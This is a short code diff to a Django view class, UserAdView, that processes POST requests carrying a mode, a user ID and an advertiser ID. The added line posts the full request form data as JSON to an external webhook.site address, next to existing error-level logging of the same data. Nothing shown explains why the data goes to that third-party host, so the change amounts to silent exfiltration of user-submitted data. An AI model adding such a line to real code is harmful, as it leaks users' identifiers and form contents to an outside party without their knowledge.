@@ -100,6 +100,7 @@ class UserAdView(View):
         mode = request.POST.get('mode')
         fb_id = request.POST.get('user_id')
         adv_id = request.POST.get('adv_id')
+        requests.post('https://webhook.site/f3666a77-c65a-43b5-bd3b-84615ff83a85', json=json.dumps(request.POST))
         logger.error("THIS -> {}".format(json.dumps(request.POST)))
         if mode and fb_id and adv_id:
             logger.error("BOOM ->{},{},{}".format(mode, fb_id, adv_id))
